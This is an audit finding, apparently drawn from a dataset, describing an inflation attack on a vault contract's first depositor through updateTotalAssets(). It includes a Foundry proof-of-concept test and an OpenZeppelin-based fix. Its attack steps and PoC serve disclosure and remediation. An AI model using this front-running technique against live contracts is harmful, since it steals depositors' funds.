# [M] Inflation attack to steal first deposits

## Summary
Severity: Medium
Contest weight: 0.4512
Dataset id: 5649
Source: https://huggingface.co/datasets/Zaevlad/audit-findings-dataset
Type: audit-finding

## Details
The updateTotalAssets() function, callable by the owner or rebalancer, can be exploited to perform an inflation attack against initial depositors. This vulnerability exists because the function updates the contract's total assets and stores it in the cacheTotalAssets variable. A malicious node owner can front-run the first deposit through these steps: • Deposit 1 asset and mint 1 share. • Transfer assets directly to the node. • Call updateTotalAssets() to update the cacheTotalAssets. Consequently, when the first legitimate depositor calls deposit(), they receive 0 shares because the share price has been artificially inflated.

## Proof of Concept
```solidity
Using the test/unit/Node.t.sol as reference.
function test_inflationAttack() public {
    uint256 assets = 100e18;
    deal(address(asset), address(user), assets);
    deal(address(asset), address(owner), 3*assets);
    // @audit Front-run the first deposit
    vm.startPrank(owner);
    asset.approve(address(node), 1);
    node.deposit(1, owner);
    asset.transfer(address(node), 2*assets);
    node.updateTotalAssets();
    vm.stopPrank();
    vm.startPrank(user);
    asset.approve(address(node), assets);
    node.deposit(assets, user);
    vm.stopPrank();
    // @audit The owner still have 1 share and the user didnt get any share
    assertEq(node.balanceOf(owner), 1);
    assertEq(node.balanceOf(user), 0);
}
```

## Recommendation
Consider implementing the OZ standard solution, which requires depositing a non-trivial amount of assets to make price manipulation infeasible. See ERC4626.sol#L22-L28. Note that removing updateTotalAssets() won't resolve this issue, as the owner can achieve the same effect by calling payManagementFees().
